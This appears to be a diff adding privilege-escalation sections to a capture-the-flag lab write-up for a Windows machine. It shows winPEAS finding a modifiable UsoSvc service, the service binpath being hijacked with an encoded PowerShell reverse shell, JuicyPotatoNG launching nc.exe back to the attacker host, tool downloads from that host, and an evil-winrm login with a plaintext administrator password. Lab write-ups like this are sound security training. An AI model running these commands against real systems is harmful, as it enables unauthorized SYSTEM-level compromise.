@@ -371,6 +371,158 @@ Network Card(s):           1 NIC(s) Installed.
 Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
 ```
 
+## Modifiable Services - UsoSvc: AllAccess
+
+```bash
+$ python3 -m http.server 9091
+Serving HTTP on 0.0.0.0 port 9091 (http://0.0.0.0:9091/) ...
+```
+
+```bash
+PS C:\> Invoke-WebRequest -Uri 'http://10.10.14.3:9091/winPEASany.exe' -OutFile C:\Temp\winPEASany.exe
+```
+
+```bash
+$ python3 -m http.server 9091
+Serving HTTP on 0.0.0.0 port 9091 (http://0.0.0.0:9091/) ...
+10.10.10.180 - - [28/May/2024 20:38:11] "GET /winPEASany.exe HTTP/1.1" 200 -
+```
+
+```bash
+PS C:\> C:\Temp\winPEASany.exe
+...
+???????????? Modifiable Services
+? Check if you can modify any service https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#services
+    LOOKS LIKE YOU CAN MODIFY OR START/STOP SOME SERVICE/s:
+    RmSvc: GenericExecute (Start/Stop)
+    UsoSvc: AllAccess, Start
+...
+```
+
+```bash
+PS C:\> sc.exe query usosvc
+SERVICE_NAME: usosvc 
+        TYPE               : 20  WIN32_SHARE_PROCESS  
+        STATE              : 4  RUNNING 
+                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
+        WIN32_EXIT_CODE    : 0  (0x0)
+        SERVICE_EXIT_CODE  : 0  (0x0)
+        CHECKPOINT         : 0x0
+        WAIT_HINT          : 0x0
+
+PS C:\> sc.exe qc usosvc
+[SC] QueryServiceConfig SUCCESS
+SERVICE_NAME: usosvc
+        TYPE               : 20  WIN32_SHARE_PROCESS 
+        START_TYPE         : 2   AUTO_START  (DELAYED)
+        ERROR_CONTROL      : 1   NORMAL
+        BINARY_PATH_NAME   : C:\Windows\system32\svchost.exe -k netsvcs -p
+        LOAD_ORDER_GROUP   : 
+        TAG                : 0
+        DISPLAY_NAME       : Update Orchestrator Service
+        DEPENDENCIES       : rpcss
+        SERVICE_START_NAME : LocalSystem
+```
+
+```bash
+PS C:\> sc.exe stop usosvc
+SERVICE_NAME: usosvc 
+        TYPE               : 20  WIN32_SHARE_PROCESS  
+        STATE              : 3  STOP_PENDING 
+                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
+        WIN32_EXIT_CODE    : 0  (0x0)
+        SERVICE_EXIT_CODE  : 0  (0x0)
+        CHECKPOINT         : 0x3
+        WAIT_HINT          : 0x7530
+
+PS C:\> sc.exe query usosvc
+SERVICE_NAME: usosvc 
+        TYPE               : 20  WIN32_SHARE_PROCESS  
+        STATE              : 1  STOPPED 
+        WIN32_EXIT_CODE    : 0  (0x0)
+        SERVICE_EXIT_CODE  : 0  (0x0)
+        CHECKPOINT         : 0x0
+        WAIT_HINT          : 0x0
+```
+
+```bash
+$ rlwrap -cAr nc -nlvp 4445
+listening on [any] 4445 ...
+```
+
+![UsoSvc](images/usosvc_revshell.png)
+
+```bash
+PS C:\> sc.exe config usosvc binpath= "cmd /c powershell -e JABjA...CgAKQA="
+[SC] ChangeServiceConfig SUCCESS
+```
+
+```bash
+PS C:\> sc.exe qc usosvc
+[SC] QueryServiceConfig SUCCESS
+SERVICE_NAME: usosvc
+        TYPE               : 20  WIN32_SHARE_PROCESS 
+        START_TYPE         : 2   AUTO_START  (DELAYED)
+        ERROR_CONTROL      : 1   NORMAL
+        BINARY_PATH_NAME   : cmd /c powershell -e JABjA...CgAKQA=
+        LOAD_ORDER_GROUP   : 
+        TAG                : 0
+        DISPLAY_NAME       : Update Orchestrator Service
+        DEPENDENCIES       : rpcss
+        SERVICE_START_NAME : LocalSystem
+
+PS C:\> sc.exe start usosvc
+[SC] StartService FAILED 1053:
+The service did not respond to the start or control request in a timely fashion.
+```
+
+```bash
+$ rlwrap -cAr nc -nlvp 4445
+listening on [any] 4445 ...
+connect to [10.10.14.3] from (UNKNOWN) [10.10.10.180] 49710
+
+PS C:\Windows\system32> whoami
+nt authority\system
+```
+
+## SeImpersonatePrivilege - Potato - JuicyPotatoNG.exe
+
+Download to the target [JuicyPotatoNG](https://github.com/antonioCoco/JuicyPotatoNG) and `nc`.
+
+```bash
+PS C:\> Invoke-WebRequest -Uri 'http://10.10.14.3:9091/nc.exe' -OutFile C:\Temp\nc.exe
+PS C:\> Invoke-WebRequest -Uri 'http://10.10.14.3:9091/JuicyPotatoNG.zip' -OutFile C:\Temp\JuicyPotatoNG.zip
+PS C:\> Expand-Archive -LiteralPath C:\Temp\JuicyPotatoNG.zip -DestinationPath C:\Temp
+```
+
+```bash
+$ python3 -m http.server 9091                                                               
+Serving HTTP on 0.0.0.0 port 9091 (http://0.0.0.0:9091/) ...
+10.10.10.180 - - [28/May/2024 23:10:39] "GET /nc.exe HTTP/1.1" 200 -
+10.10.10.180 - - [28/May/2024 23:11:01] "GET /JuicyPotatoNG.zip HTTP/1.1" 200 -
+```
+
+```bash
+$ rlwrap -cAr nc -nlvp 4446  
+listening on [any] 4446 ...
+```
+
+```bash
+PS C:\> C:\Temp\JuicyPotatoNG.exe -t * -p 'C:\Temp\nc.exe' -a "-e powershell.exe 10.10.14.3 4446"
+```
+
+```bash
+$ rlwrap -cAr nc -nlvp 4446  
+listening on [any] 4446 ...
+connect to [10.10.14.3] from (UNKNOWN) [10.10.10.180] 49764
+Windows PowerShell 
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+PS C:\> whoami
+whoami
+nt authority\system
+```
+
 ## CVE-2019-18988
 
 - [CVE-2019-18988](https://github.com/rafamarrara/CTFs/tree/main/Labs/CVE-2019-18988)
@@ -608,4 +760,12 @@ msf6 post(windows/gather/credentials/teamviewer_passwords) > exploit
 [-] Unable to find TeamViewer's process
 [*] Post module execution completed
 msf6 post(windows/gather/credentials/teamviewer_passwords) >
+```
+
+```bash
+$ evil-winrm -i $TARGET -u administrator -p '!R3m0te!'
+...
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
+remote\administrator
 ```
